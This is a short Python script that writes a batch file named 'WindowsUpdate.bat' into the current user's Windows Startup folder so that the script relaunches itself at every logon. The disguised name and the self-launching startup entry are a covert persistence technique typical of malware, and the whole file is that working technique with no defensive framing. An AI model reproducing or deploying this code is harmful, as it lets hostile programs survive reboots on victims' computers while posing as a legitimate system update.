import getpass

USER_NAME = getpass.getuser()

bat_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % USER_NAME
with open(bat_path + '\\' + "WindowsUpdate.bat", "w+") as bat_file:
    bat_file.write(r'start "" %s' % __file__)